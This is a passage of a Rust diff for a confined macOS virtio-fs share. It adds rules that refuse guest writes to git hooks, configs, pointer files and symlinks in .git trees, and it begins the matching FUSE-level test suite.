++            self.walk_noting(st, vec![root.clone()], t.written.clone(), true, Some(&mut names))?;
++        }
++        Ok(names)
++    }
++
++    fn is_protected_name(&self, st: &State, g: &GitState, dir: &[Hop], name: &[u8]) -> io::Result<bool> {
++        if g.targets.is_empty() {
++            return Ok(false);
++        }
++        let d = dir.last().map(|h| h.id).unwrap_or_default();
++        Ok(self.protected_names(st, g)?.iter().any(|(id, n)| *id == d && g.may_alias(name, n)))
++    }
++
++    /// A new entry `name` in `dir` would create a tracked target (or move a directory onto its path), or
++    /// lands inside a tracked tree.
++    fn target_refuses_new(&self, st: &State, g: &GitState, dir: &[Hop], name: &[u8], dir_rename: bool) -> io::Result<bool> {
++        let here = ids(dir);
++        let d = dir.last().map(|h| h.id);
++        for (_, walk) in self.resolve_targets(st, g)? {
++            match walk {
++                Walk::Dir(c) => {
++                    if c.last().is_some_and(|t| here.contains(&t.id)) {
++                        return Ok(true);
++                    }
++                }
++                Walk::Missing { parent, rest } => {
++                    let next = rest.iter().find(|r| !r.is_empty() && r.as_slice() != b".");
++                    let remaining = rest.iter().filter(|r| !r.is_empty() && r.as_slice() != b".").count();
++                    if let Some(next) = next {
++                        if parent.last().map(|h| h.id) == d && g.may_alias(name, next) && (remaining == 1 || dir_rename) {
++                            return Ok(true);
++                        }
++                    }
++                }
++                _ => {}
++            }
++        }
++        Ok(false)
++    }
++
++    /// An existing entry (identity `x` in `dir`) is a tracked target, lies inside a tracked tree, or (for a
++    /// rename) is a directory on the way to one.
++    fn target_refuses_existing(&self, st: &State, g: &GitState, dir: &[Hop], x: (u64, u64), rename: bool) -> io::Result<bool> {
++        let here = ids(dir);
++        for (_, walk) in self.resolve_targets(st, g)? {
++            let (target, on_the_way) = match &walk {
++                Walk::Dir(c) => (c.last().map(|h| h.id), ids(&c[1..c.len().saturating_sub(1).max(1)])),
++                Walk::File { parent, stat, .. } => (Some(dev_ino(stat)), ids(&parent[1..])),
++                Walk::Missing { parent, .. } => (None, ids(&parent[1..])),
++                _ => continue,
++            };
++            if target == Some(x) {
++                return Ok(true);
++            }
++            if let (Walk::Dir(_), Some(t)) = (&walk, target) {
++                if here.contains(&t) {
++                    return Ok(true);
++                }
++            }
++            if rename && on_the_way.contains(&x) {
++                return Ok(true);
++            }
++        }
++        Ok(false)
++    }
++
++    /// A node is a tracked target or inside a tracked tree.
++    fn target_holds_node(&self, st: &State, g: &GitState, parent: &[Hop], x: (u64, u64)) -> io::Result<bool> {
++        let here = ids(parent);
++        for (_, walk) in self.resolve_targets(st, g)? {
++            match walk {
++                Walk::Dir(c) => {
++                    if let Some(t) = c.last() {
++                        if t.id == x || here.contains(&t.id) {
++                            return Ok(true);
++                        }
++                    }
++                }
++                Walk::File { stat, .. } => {
++                    if dev_ino(&stat) == x {
++                        return Ok(true);
++                    }
++                }
++                _ => {}
++            }
++        }
++        Ok(false)
++    }
++
++    // ---- the rules ------------------------------------------------------------------------------------
++
++    fn class_of(&self, st: &mut State, g: &mut GitState, id: u64) -> io::Result<Class> {
++        if id == ROOT_ID {
++            return Ok(Class::Plain);
++        }
++        let node = st.nodes.get(&id).ok_or_else(|| err(lx::ESTALE))?;
++        let (x, parent, name, kind) = ((node.dev, node.ino), node.parent, node.name.to_bytes().to_vec(), node.kind);
++        if let Some(class) = g.held.get(&x) {
++            return Ok(*class);
++        }
++        let chain = self.node_chain(st, parent)?;
++        let place = self.place(g, &chain)?;
++        let class = if self.below_hooks(g, &chain)?
++            || (place.zone && g.is(&name, "hooks"))
++            || (!g.targets.is_empty() && self.target_holds_node(st, g, &chain, x)?)
++        {
++            Class::Immutable
++        } else if place.zone && g.is_any(&name, &CONFIGS) {
++            Class::Config
++        } else if kind == Kind::File && g.is(&name, ".git") && !place.exempt {
++            Class::Pointer(PointerKind::Gitfile)
++        } else if kind == Kind::File && g.is(&name, "commondir") {
++            Class::Pointer(PointerKind::Commondir)
++        } else if kind == Kind::File && g.is(&name, "gitdir") {
++            Class::Pointer(PointerKind::Gitdir)
++        } else {
++            Class::Plain
++        };
++        if class != Class::Plain {
++            g.held.insert(x, class);
++        }
++        Ok(class)
++    }
++
++    fn new_entry(&self, st: &mut State, g: &GitState, parent: u64, name: &[u8], how: How) -> io::Result<()> {
++        let chain = self.node_chain(st, parent)?;
++        let dir = chain.last().ok_or_else(|| err(lx::ESTALE))?.fd.as_raw_fd();
++        let place = self.place(g, &chain)?;
++        // Below an existing hooks directory, and inside a tracked tree or onto a tracked name: nothing.
++        if self.below_hooks(g, &chain)? {
++            return refuse();
++        }
++        if !g.targets.is_empty() && self.target_refuses_new(st, g, &chain, name, how == How::RenameDir)? {
++            return refuse();
++        }
++        // A tracked path's written names (and the links on its way) are never replaced or re-pointed.
++        if matches!(how, How::Symlink | How::Link | How::RenameFile | How::RenameDir) && self.is_protected_name(st, g, &chain, name)? {
++            return refuse();
++        }
++        let exists = self.holds(dir, name)?;
++        // Inside refs/ and logs/: never a .git, commondir or gitdir.
++        if place.exempt && g.is_any(name, &[".git", "commondir", "gitdir"]) {
++            return refuse();
++        }
++        // Pointer files: only a regular file created empty (or a directory named .git); never a link, a
++        // hard link or a rename onto one.
++        if g.is(name, ".git") && !matches!(how, How::File | How::Dir) {
++            return refuse();
++        }
++        if g.is_any(name, &["commondir", "gitdir"]) && (how != How::File || !place.dotgit) {
++            return refuse();
++        }
++        // Creation order (H5): a directory never turns into a git directory around a hooks entry or a
++        // configuration the server did not admit.
++        if g.is_any(name, &MARKERS) && exists.is_none() && self.failing_dir(g, &chain)? {
++            return refuse();
++        }
++        // No new git directories outside a .git chain (H2).
++        if g.is(name, "HEAD") && !place.dotgit {
++            return refuse();
++        }
++        if !place.dotgit
++            && ((g.is(name, "objects") && self.holds(dir, b"refs")?.is_some()) || (g.is(name, "refs") && self.holds(dir, b"objects")?.is_some()))
++        {
++            return refuse();
++        }
++        if place.zone {
++            if g.is(name, "hooks") {
++                return refuse();
++            }
++            if g.is_any(name, &CONFIGS) && matches!(how, How::File | How::Symlink | How::Link) {
++                return refuse();
++            }
++            // No directory is renamed into the zone (H4, H5).
++            if how == How::RenameDir {
++                return refuse();
++            }
++        }
++        Ok(())
++    }
++
++    /// A symbolic link may never appear in a `.git` chain or the zone (the Mac's git would follow it), except
++    /// git's own `core.symlinks` probe: `t` and six characters, pointing at `testing`, which git removes at
++    /// once. `target` is the text of a new link (`None` for a link moved or hard-linked in).
++    fn link_rules(&self, st: &mut State, g: &GitState, parent: u64, name: &[u8], target: Option<&[u8]>) -> io::Result<()> {
++        let chain = self.node_chain(st, parent)?;
++        let place = self.place(g, &chain)?;
++        let probe = target == Some(b"testing") && name.len() == 7 && name[0] == b't' && name[1..].iter().all(u8::is_ascii_alphanumeric);
++        if (place.dotgit || place.zone) && !probe {
++            return refuse();
++        }
++        Ok(())
++    }
++
++    fn existing_entry(&self, st: &mut State, g: &GitState, parent: u64, name: &[u8], how: Removal) -> io::Result<()> {
++        let chain = self.node_chain(st, parent)?;
++        let dir = chain.last().ok_or_else(|| err(lx::ESTALE))?.fd.as_raw_fd();
++        let Some(s) = self.holds(dir, name)? else { return Ok(()) };
++        let x = dev_ino(&s);
++        if self.below_hooks(g, &chain)? {
++            return refuse();
++        }
++        if !g.targets.is_empty() && self.target_refuses_existing(st, g, &chain, x, how == Removal::RenameOut)? {
++            return refuse();
++        }
++        if self.is_protected_name(st, g, &chain, name)? {
++            return refuse();
++        }
++        let place = self.place(g, &chain)?;
++        let worktree_unlink = how == Removal::Unlink && place.zone && g.is(name, "config.worktree");
++        match g.held.get(&x) {
++            Some(Class::Immutable) => return refuse(),
++            Some(Class::Config) if !worktree_unlink => return refuse(),
++            _ => {}
++        }
++        if place.zone && (g.is(name, "hooks") || g.is(name, "config")) {
++            return refuse();
++        }
++        if place.zone && g.is(name, "config.worktree") && !worktree_unlink {
++            return refuse();
++        }
++        // Git directories are never moved or removed (H4).
++        if kind_of(s.st_mode) == Kind::Dir && how != Removal::Unlink && self.is_git_dir(g, &self.hop_into(&chain, name, &s)?)? {
++            return refuse();
++        }
++        Ok(())
++    }
++
++    #[allow(clippy::too_many_arguments)]
++    fn rename_rules(&self, st: &mut State, g: &GitState, old_parent: u64, old: &[u8], new_parent: u64, new: &[u8], flags: u32) -> io::Result<()> {
++        let ochain = self.node_chain(st, old_parent)?;
++        let Some(src) = self.holds(ochain.last().ok_or_else(|| err(lx::ESTALE))?.fd.as_raw_fd(), old)? else { return Ok(()) };
++        self.existing_entry(st, g, old_parent, old, Removal::RenameOut)?;
++        let how = |s: &libc::stat| if kind_of(s.st_mode) == Kind::Dir { How::RenameDir } else { How::RenameFile };
++        let nchain = self.node_chain(st, new_parent)?;
++        let nplace = self.place(g, &nchain)?;
++        let dst = self.holds(nchain.last().ok_or_else(|| err(lx::ESTALE))?.fd.as_raw_fd(), new)?;
++        if flags == LINUX_RENAME_EXCHANGE {
++            // An exchange moves both entries out of their names (so it is never git's lock path, and the
++            // existing-entry rules refuse a config, a hooks entry or a git directory on either side).
++            let Some(d) = dst else { return Ok(()) };
++            self.existing_entry(st, g, new_parent, new, Removal::RenameOut)?;
++            self.new_entry(st, g, old_parent, old, how(&d))?;
++            if kind_of(d.st_mode) == Kind::Symlink {
++                self.link_rules(st, g, old_parent, old, None)?;
++            }
++            if kind_of(src.st_mode) == Kind::Symlink {
++                self.link_rules(st, g, new_parent, new, None)?;
++            }
++            return self.new_entry(st, g, new_parent, new, how(&src));
++        }
++        if kind_of(src.st_mode) == Kind::Symlink {
++            self.link_rules(st, g, new_parent, new, None)?;
++        }
++        let lock_rename = nplace.zone && g.is_any(new, &CONFIGS) && how(&src) == How::RenameFile;
++        if dst.is_some() && !lock_rename {
++            self.existing_entry(st, g, new_parent, new, Removal::RenameOut)?;
++        }
++        self.new_entry(st, g, new_parent, new, how(&src))?;
++        if lock_rename {
++            self.config_rename(st, g, old_parent == new_parent, &ochain, old, &src, &nchain, new, dst)?;
++        }
++        Ok(())
++    }
++
++    /// The only way to change `config` or `config.worktree`: git's own `<name>.lock` in the same
++    /// directory, renamed. The source is a single-link regular file with no writable handle; its keys,
++    /// parsed strictly, may add or change only admitted keys.
++    #[allow(clippy::too_many_arguments)]
++    fn config_rename(
++        &self,
++        st: &mut State,
++        g: &GitState,
++        same_dir: bool,
++        source_dir: &[Hop],
++        old: &[u8],
++        src: &libc::stat,
++        chain: &[Hop],
++        new: &[u8],
++        dst: Option<libc::stat>,
++    ) -> io::Result<()> {
++        if !same_dir {
++            return refuse();
++        }
++        let lock_name = [new, b".lock"].concat();
++        if !(if g.case_sensitive { old == lock_name.as_slice() } else { fold(old) == fold(&lock_name) }) {
++            return refuse();
++        }
++        if src.st_nlink != 1 {
++            return refuse();
++        }
++        let x = dev_ino(src);
++        let writable = st.handles.values().any(|h| h.writable && st.nodes.get(&h.node).is_some_and(|n| (n.dev, n.ino) == x));
++        if writable {
++            return refuse();
++        }
++        let dir = chain.last().ok_or_else(|| err(lx::ESTALE))?.fd.as_raw_fd();
++        let from = source_dir.last().ok_or_else(|| err(lx::ESTALE))?.fd.as_raw_fd();
++        let Ok(text) = self.read_small(from, old, src, CONFIG_MAX) else { return refuse() };
++        let Ok(added) = gitconfig::parse(&text) else { return refuse() };
++        let current: HashSet<ConfigEntry> = match dst {
++            None => HashSet::new(),
++            Some(d) if kind_of(d.st_mode) == Kind::File => self
++                .read_small(dir, new, &d, CONFIG_MAX)
++                .ok()
++                .and_then(|t| gitconfig::parse(&t).ok())
++                .unwrap_or_default()
++                .into_iter()
++                .collect(),
++            Some(_) => return refuse(),
++        };
++        let mut ok = |v: &[u8]| self.worktree_ok(g, chain, v);
++        if added.iter().any(|e| !current.contains(e) && !gitconfig::admitted(e, &mut ok)) {
++            return refuse();
++        }
++        Ok(())
++    }
++
++    /// A watched name (T18, T19): allowed, reported once per kind.
++    fn watched(&self, g: &GitState, chain: &[Hop], name: &[u8]) -> Option<NoticeKind> {
++        let parent: &[u8] = chain.last().map(|h| h.name.as_slice()).unwrap_or_default();
++        if g.is(name, ".envrc") {
++            return Some(NoticeKind::Envrc);
++        }
++        if g.is(parent, ".vscode") && g.is(name, "tasks.json") {
++            return Some(NoticeKind::VscodeTasks);
++        }
++        if g.is(parent, ".vscode") && g.is(name, "settings.json") {
++            return Some(NoticeKind::VscodeSettings);
++        }
++        if g.ends(name, ".code-workspace") {
++            return Some(NoticeKind::CodeWorkspace);
++        }
++        if (g.is(parent, ".idea") && g.ends(name, ".xml"))
++            || chain.windows(2).any(|w| g.is(&w[0].name, ".idea") && g.is(&w[1].name, "runConfigurations"))
++        {
++            return Some(NoticeKind::IdeaProject);
++        }
++        None
++    }
++
++    fn watched_entry(&self, st: &mut State, g: &GitState, parent: u64, name: &[u8]) -> io::Result<Option<NoticeKind>> {
++        let chain = self.node_chain(st, parent)?;
++        Ok(self.watched(g, &chain, name))
++    }
++
++    fn watched_node(&self, st: &mut State, g: &GitState, id: u64) -> io::Result<Option<NoticeKind>> {
++        let Some(node) = st.nodes.get(&id) else { return Ok(None) };
++        if id == ROOT_ID {
++            return Ok(None);
++        }
++        let (parent, name) = (node.parent, node.name.to_bytes().to_vec());
++        self.watched_entry(st, g, parent, &name)
++    }
++
++    fn rules(&self, st: &mut State, g: &mut GitState, op: &Mutation) -> io::Result<Option<NoticeKind>> {
++        // A node this device does not hold is refused by the core itself (ESTALE, or EXDEV under R5); the
++        // rules have nothing to look at.
++        let ids: &[u64] = match *op {
++            Mutation::Create { parent, .. }
++            | Mutation::Mkdir { parent, .. }
++            | Mutation::Mknod { parent, .. }
++            | Mutation::Symlink { parent, .. }
++            | Mutation::Unlink { parent, .. }
++            | Mutation::Rmdir { parent, .. } => &[parent],
++            Mutation::Link { node, parent, .. } => &[node, parent],
++            Mutation::Rename { old_parent, new_parent, .. } => &[old_parent, new_parent],
++            Mutation::Setattr { node, .. } | Mutation::OpenWrite { node, .. } | Mutation::Write { node, .. } | Mutation::Fallocate { node, .. } => &[node],
++        };
++        if ids.iter().any(|id| !st.nodes.contains_key(id)) {
++            return Ok(None);
++        }
++        match *op {
++            Mutation::Create { parent, name } | Mutation::Mknod { parent, name } => {
++                self.new_entry(st, g, parent, name.to_bytes(), How::File)?;
++                self.watched_entry(st, g, parent, name.to_bytes())
++            }
++            Mutation::Mkdir { parent, name } => self.new_entry(st, g, parent, name.to_bytes(), How::Dir).map(|_| None),
++            Mutation::Symlink { parent, name, target } => {
++                self.new_entry(st, g, parent, name.to_bytes(), How::Symlink)?;
++                self.link_rules(st, g, parent, name.to_bytes(), Some(target.to_bytes()))?;
++                self.watched_entry(st, g, parent, name.to_bytes())
++            }
++            Mutation::Link { node, parent, name } => {
++                if self.class_of(st, g, node)? != Class::Plain {
++                    return refuse();
++                }
++                self.new_entry(st, g, parent, name.to_bytes(), How::Link)?;
++                if st.nodes.get(&node).is_some_and(|n| n.kind == Kind::Symlink) {
++                    self.link_rules(st, g, parent, name.to_bytes(), None)?;
++                }
++                self.watched_entry(st, g, parent, name.to_bytes())
++            }
++            Mutation::Unlink { parent, name } => self.existing_entry(st, g, parent, name.to_bytes(), Removal::Unlink).map(|_| None),
++            Mutation::Rmdir { parent, name } => self.existing_entry(st, g, parent, name.to_bytes(), Removal::Rmdir).map(|_| None),
++            Mutation::Rename { old_parent, old_name, new_parent, new_name, flags } => {
++                self.rename_rules(st, g, old_parent, old_name.to_bytes(), new_parent, new_name.to_bytes(), flags)?;
++                self.watched_entry(st, g, new_parent, new_name.to_bytes())
++            }
++            Mutation::Setattr { node, valid, .. } => {
++                let size = valid.contains(SetattrValid::SIZE);
++                match self.class_of(st, g, node)? {
++                    Class::Immutable => return refuse(),
++                    Class::Config | Class::Pointer(_) if size => return refuse(),
++                    _ => {}
++                }
++                if size {
++                    self.watched_node(st, g, node)
++                } else {
++                    Ok(None)
++                }
++            }
++            Mutation::OpenWrite { node, .. } => match self.class_of(st, g, node)? {
++                Class::Immutable | Class::Config => refuse(),
++                _ => self.watched_node(st, g, node),
++            },
++            // A pointer file's writes go to its buffer and never reach here.
++            Mutation::Write { node, .. } | Mutation::Fallocate { node, .. } => match self.class_of(st, g, node)? {
++                Class::Plain => Ok(None),
++                _ => refuse(),
++            },
++        }
++    }
++
++    /// The R15 chokepoint, called from `ConfinedFs::admit` after the read-only check. A refusal reports
++    /// `git_protected`; an allowed write to a watched name reports its kind.
++    pub(super) fn git_admit(&self, op: &Mutation) -> io::Result<()> {
++        let mut st = self.lock();
++        let Some(mut g) = st.git.take() else { return Ok(()) };
++        let res = self.rules(&mut st, &mut g, op);
++        st.git = Some(g);
++        match res {
++            Ok(Some(kind)) => {
++                self.notices.push(kind);
++                Ok(())
++            }
++            Ok(None) => Ok(()),
++            Err(e) => {
++                if e.raw_os_error() == Some(lx::EPERM) {
++                    self.notices.push(NoticeKind::GitProtected);
++                }
++                Err(e)
++            }
++        }
++    }
++
++    // ---- pointer files ----------------------------------------------------------------------------------
++
++    /// The pointer kind of a new regular file named `name` (CREATE), if R15 is active.
++    pub(super) fn git_pointer_name(&self, st: &State, name: &[u8]) -> Option<PointerKind> {
++        let g = st.git.as_ref()?;
++        if g.is(name, ".git") {
++            Some(PointerKind::Gitfile)
++        } else if g.is(name, "commondir") {
++            Some(PointerKind::Commondir)
++        } else if g.is(name, "gitdir") {
++            Some(PointerKind::Gitdir)
++        } else {
++            None
++        }
++    }
++
++    /// The pointer kind of an existing node opened for writing, if R15 is active.
++    pub(super) fn git_pointer_node(&self, st: &mut State, id: u64) -> io::Result<Option<PointerKind>> {
++        let Some(mut g) = st.git.take() else { return Ok(None) };
++        let res = self.class_of(st, &mut g, id);
++        st.git = Some(g);
++        Ok(match res? {
++            Class::Pointer(kind) => Some(kind),
++            _ => None,
++        })
++    }
++
++    /// Checks a pointer file's buffered content (on FLUSH or RELEASE). `EPERM` and a notice unless it is
++    /// exactly one line of the right form naming an admissible target.
++    pub(super) fn git_pointer_check(&self, st: &mut State, node: u64, kind: PointerKind, buf: &[u8]) -> io::Result<()> {
++        let Some(mut g) = st.git.take() else { return refuse() };
++        let res = self.pointer_valid(st, &mut g, node, kind, buf);
++        st.git = Some(g);
++        if matches!(res, Ok(true)) {
++            return Ok(());
++        }
++        self.notices.push(NoticeKind::GitProtected);
++        refuse()
++    }
++
++    /// Some directory at index `k` < `upto` of `chain` is a `modules/` or `worktrees/` directly under a
++    /// git directory of a `.git` chain.
++    fn below_modules(&self, g: &GitState, chain: &[Hop], upto: usize) -> io::Result<bool> {
++        for k in 1..upto.min(chain.len()) {
++            if g.is_any(&chain[k].name, &["modules", "worktrees"]) {
++                let p = self.place(g, &chain[..k])?;
++                if p.git_dir && p.dotgit && !p.exempt {
++                    return Ok(true);
++                }
++            }
++        }
++        Ok(false)
++    }
++
++    fn pointer_valid(&self, st: &mut State, g: &mut GitState, node: u64, kind: PointerKind, buf: &[u8]) -> io::Result<bool> {
++        let parent = st.nodes.get(&node).ok_or_else(|| err(lx::ESTALE))?.parent;
++        let here = self.node_chain(st, parent)?;
++        let Some(path) = pointer_line(buf, kind) else { return Ok(false) };
++        match kind {
++            // A gitfile names an existing directory under some .git/modules/ or .git/worktrees/ (or one
++            // still to be made there, as `git submodule` writes the gitfile first), outside refs/ and
++            // logs/, holding no hooks entry and no non-admitted config.
++            PointerKind::Gitfile => match self.walk_text(st, here, path, false)? {
++                Walk::Dir(target) => Ok(self.below_modules(g, &target, target.len() - 1)?
++                    && !self.place(g, &target)?.exempt
++                    && !self.failing_dir(g, &target)?),
++                Walk::Missing { parent, rest } => {
++                    let parts: Vec<&Vec<u8>> = rest.iter().filter(|r| !r.is_empty() && r.as_slice() != b".").collect();
++                    Ok(!parts.is_empty()
++                        && parts.iter().all(|r| r.as_slice() != b".." && check_name(r).is_ok())
++                        && self.below_modules(g, &parent, parent.len())?
++                        && !self.place(g, &parent)?.exempt)
++                }
++                _ => Ok(false),
++            },
++            PointerKind::Commondir | PointerKind::Gitdir => {
++                // Only in <git dir>/worktrees/<name>/.
++                let n = here.len();
++                if n < 3 || !g.is(&here[n - 2].name, "worktrees") {
++                    return Ok(false);
++                }
++                let common = &here[..n - 2];
++                let p = self.place(g, common)?;
++                if !(p.git_dir && p.dotgit && !p.exempt) {
++                    return Ok(false);
++                }
++                let walk = self.walk_text(st, here.clone(), path, false)?;
++                match (kind, walk) {
++                    // commondir: exactly the git directory that holds this worktrees/, re-validated (H5).
++                    (PointerKind::Commondir, Walk::Dir(target)) => {
++                        Ok(target.last().map(|h| h.id) == common.last().map(|h| h.id) && !self.failing_dir(g, common)?)
++                    }
++                    // gitdir: a regular file named .git outside every .git chain (the worktree's gitfile,
++                    // which `git worktree add` writes just after).
++                    (PointerKind::Gitdir, Walk::File { parent, name, stat }) => {
++                        let p = self.place(g, &parent)?;
++                        Ok(g.is(&name, ".git") && kind_of(stat.st_mode) == Kind::File && !p.dotgit && !p.zone)
++                    }
++                    (PointerKind::Gitdir, Walk::Missing { parent, rest }) => {
++                        let parts: Vec<&Vec<u8>> = rest.iter().filter(|r| !r.is_empty() && r.as_slice() != b".").collect();
++                        let p = self.place(g, &parent)?;
++                        Ok(parts.len() == 1 && g.is(parts[0], ".git") && !p.dotgit && !p.zone)
++                    }
++                    _ => Ok(false),
++                }
++            }
++        }
++    }
++
++    // ---- bookkeeping after a host change ----------------------------------------------------------
++
++    /// Records the class of a node just looked up under a protected name, so its identity stays protected.
++    pub(super) fn git_hold(&self, st: &mut State, id: u64) -> io::Result<()> {
++        let Some(mut g) = st.git.take() else { return Ok(()) };
++        let candidate = st.nodes.get(&id).is_some_and(|n| g.is_any(n.name.to_bytes(), &["hooks", "config", "config.worktree", ".git", "commondir", "gitdir"]));
++        let res = if candidate { self.class_of(st, &mut g, id).map(drop) } else { Ok(()) };
++        st.git = Some(g);
++        res
++    }
++
++    /// The identity of `name` in a held directory, if R15 is active (before an unlink or rename).
++    pub(super) fn git_identity(&self, st: &State, dir: RawFd, name: &[u8]) -> Option<(u64, u64)> {
++        st.git.as_ref()?;
++        self.holds(dir, name).ok().flatten().map(|s| dev_ino(&s))
++    }
++
++    /// An entry left its name: its held class goes with it.
++    pub(super) fn git_forget(&self, st: &mut State, x: Option<(u64, u64)>) {
++        if let (Some(g), Some(x)) = (st.git.as_mut(), x) {
++            g.held.remove(&x);
++        }
++    }
++
++    /// After a rename onto `config`/`config.worktree` in the zone: the new file is held as a config and
++    /// the repository's tracked set is read again (it only ever grows).
++    pub(super) fn git_renamed(&self, st: &mut State, parent: u64, name: &[u8], x: (u64, u64)) -> io::Result<()> {
++        let Some(mut g) = st.git.take() else { return Ok(()) };
++        let res = (|| {
++            let chain = self.node_chain(st, parent)?;
++            let place = self.place(&g, &chain)?;
++            if place.zone && g.is_any(name, &CONFIGS) {
++                g.held.insert(x, Class::Config);
++                if place.git_dir {
++                    let last = chain.last().ok_or_else(|| err(lx::ESTALE))?;
++                    let top = if g.is(&last.name, ".git") { &chain[..chain.len() - 1] } else { &chain[..] };
++                    self.discover_git_dir(st, &mut g, &chain, top, true)?;
++                }
++            }
++            Ok(())
++        })();
++        st.git = Some(g);
++        res
++    }
++}
+diff --git a/src/devices/src/virtio/fs/macos/confined/git_tests.rs b/src/devices/src/virtio/fs/macos/confined/git_tests.rs
+new file mode 100644
+index 0000000..271cce7
+--- /dev/null
++++ b/src/devices/src/virtio/fs/macos/confined/git_tests.rs
+@@ -0,0 +1,1441 @@
++// R15 and R16 suites (design 2.7, T17, T17b, T17c, T18-T20): FUSE messages through
++// `Server::handle_confined_message` against temporary trees. The host's own git only builds reference
++// layouts in separate temporary directories and reads the replayed result; it never runs in a real
++// repository.
++
++use std::os::unix::fs::symlink;
++use std::process::{Command, Output};
++
++use super::*;
++
++const GUEST: &str = "/workspace/folders/test";
++const FOLDER: ShareFlags = ShareFlags { read_only: false, winter_share: false, folder_rules: true };
++const EPERM: i32 = lx::EPERM;
++const FATTR_MODE: u32 = 1;
++const FATTR_SIZE: u32 = 8;
++
++fn folder(prepare: impl FnOnce(&Path)) -> Share {
++    Share::build(FOLDER, prepare)
++}
++
++/// A folder share whose guest mount path is the host path of its root, so the absolute pointer paths it
++/// accepts are valid for the host's own git too.
++fn folder_at_host_path() -> Share {
++    let tree = TempTree::new();
++    let root = tree.0.join("root");
++    let outside = tree.0.join("outside");
++    fs::create_dir(&root).unwrap();
++    fs::create_dir(&outside).unwrap();
++    let guest = CString::new(root.as_os_str().as_bytes()).unwrap();
++    let fs = ConfinedFs::new(ConfinedConfig { root: root_fd(&root), flags: FOLDER, guest_path: guest }).unwrap();
++    Share::with_fs(tree, root, outside, fs)
++}
++
++fn insensitive(share: &Share) -> bool {
++    !share.fs().lock().git.as_ref().unwrap().case_sensitive
++}
++
++/// A minimal repository the user made on the Mac: a `.git` with HEAD, objects, refs and a config.
++fn plant_repo(dir: &Path, config: &str) {
++    fs::create_dir_all(dir.join(".git/objects")).unwrap();
++    fs::create_dir_all(dir.join(".git/refs/heads")).unwrap();
++    fs::create_dir_all(dir.join(".git/refs/tags")).unwrap();
++    fs::write(dir.join(".git/HEAD"), "ref: refs/heads/main\n").unwrap();
++    fs::write(dir.join(".git/config"), config).unwrap();
++}
++
++const PLAIN_CONFIG: &str = "[core]\n\trepositoryformatversion = 0\n\tfilemode = true\n\tbare = false\n\tlogallrefupdates = true\n";
++
++impl Share {
++    fn try_at(&mut self, path: &str) -> Result<u64, i32> {
++        let mut node = 1;
++        for part in path.split('/').filter(|c| !c.is_empty()) {
++            let reply = self.lookup(node, part.as_bytes());
++            if reply.error != 0 {
++                return Err(reply.error);
++            }
++            node = reply.obj::<EntryOut>().nodeid;
++        }
++        Ok(node)
++    }
++
++    fn at(&mut self, path: &str) -> u64 {
++        self.try_at(path).unwrap_or_else(|e| panic!("lookup {path}: {e}"))
++    }
++
++    fn split<'a>(&mut self, path: &'a str) -> (u64, &'a str) {
++        match path.rsplit_once('/') {
++            Some((dir, name)) => (self.at(dir), name),
++            None => (1, path),
++        }
++    }
++
++    fn md(&mut self, path: &str) -> i32 {
++        let (dir, name) = self.split(path);
++        self.mkdir(dir, name.as_bytes(), 0o755).error
++    }
++
++    fn flush(&mut self, node: u64, fh: u64) -> Reply {
++        self.call(Opcode::Flush, node, FlushIn { fh, unused: 0, padding: 0, lock_owner: 0 }.as_slice())
++    }
++
++    fn setattr_fh(&mut self, node: u64, fh: u64, valid: u32, mode: u32, size: u64) -> Reply {
++        self.call(Opcode::Setattr, node, SetattrIn { valid: valid | FATTR_FH, fh, mode, size, ..Default::default() }.as_slice())
++    }
++
++    /// CREATE, WRITE, FLUSH and RELEASE, as `write_file` does in git; the first error.
++    fn put(&mut self, path: &str, data: &[u8]) -> i32 {
++        let (dir, name) = self.split(path);
++        let reply = self.create(dir, name.as_bytes(), 0o644, RDWR);
++        if reply.error != 0 {
++            return reply.error;
++        }
++        let node = reply.obj::<EntryOut>().nodeid;
++        let fh = OpenOut::from_slice(&reply.body[std::mem::size_of::<EntryOut>()..][..std::mem::size_of::<OpenOut>()]).unwrap().fh;
++        let written = if data.is_empty() { 0 } else { self.write(node, fh, 0, data).error };
++        let flushed = self.flush(node, fh).error;
++        self.release(node, fh);
++        if written != 0 {
++            written
++        } else {
++            flushed
++        }
++    }
++
++    /// An existing file rewritten as the Linux kernel sends `open(O_WRONLY | O_TRUNC)` without atomic
++    /// O_TRUNC: OPEN, SETATTR size 0 through the handle, WRITE, FLUSH, RELEASE; the first error.
++    fn rewrite(&mut self, path: &str, data: &[u8]) -> i32 {
++        let node = match self.try_at(path) {
++            Ok(node) => node,
++            Err(e) => return e,
++        };
++        let open = self.open(node, WRONLY);
++        if open.error != 0 {
++            return open.error;
++        }
++        let fh = open.obj::<OpenOut>().fh;
++        let steps = [self.setattr_fh(node, fh, FATTR_SIZE, 0, 0).error, self.write(node, fh, 0, data).error, self.flush(node, fh).error];
++        self.release(node, fh);
++        steps.into_iter().find(|e| *e != 0).unwrap_or(0)
++    }
++
++    fn ren(&mut self, from: &str, to: &str) -> i32 {
++        let (old, old_name) = self.split(from);
++        let (new, new_name) = self.split(to);
++        self.rename(old, old_name.as_bytes(), new, new_name.as_bytes()).error
++    }
++
++    fn exchange(&mut self, a: &str, b: &str) -> i32 {
++        let (old, old_name) = self.split(a);
++        let (new, new_name) = self.split(b);
++        self.rename2(old, old_name.as_bytes(), new, new_name.as_bytes(), 2).error
++    }
++
++    /// git's own lock and rename: `<path>.lock` written, then renamed onto `<path>`. A refused rename
++    /// removes the lock again, as git does.
++    fn lock_rename(&mut self, path: &str, data: &[u8]) -> i32 {
++        let lock = format!("{path}.lock");
++        let e = self.put(&lock, data);
++        if e != 0 {
++            return e;
++        }
++        let e = self.ren(&lock, path);
++        if e != 0 {
++            self.rm(&lock);
++        }
++        e
++    }
++
++    fn rm(&mut self, path: &str) -> i32 {
++        let (dir, name) = self.split(path);
++        self.remove(Opcode::Unlink, dir, name.as_bytes()).error
++    }
++
++    fn rd(&mut self, path: &str) -> i32 {
++        let (dir, name) = self.split(path);
++        self.remove(Opcode::Rmdir, dir, name.as_bytes()).error
++    }
++
++    fn sym(&mut self, path: &str, target: &str) -> i32 {
++        let (dir, name) = self.split(path);
++        self.symlink(dir, name.as_bytes(), target.as_bytes()).error
++    }
++
++    fn hard(&mut self, from: &str, to: &str) -> i32 {
++        let node = self.at(from);
++        let (dir, name) = self.split(to);
++        self.link(node, dir, name.as_bytes()).error
++    }
++
++    fn open_w(&mut self, path: &str) -> i32 {
++        let node = self.at(path);
++        let reply = self.open(node, WRONLY);
++        if reply.error == 0 {
++            let fh = reply.obj::<OpenOut>().fh;
++            self.release(node, fh);
++        }
++        reply.error
++    }
++
++    fn notices(&self) -> Vec<NoticeKind> {
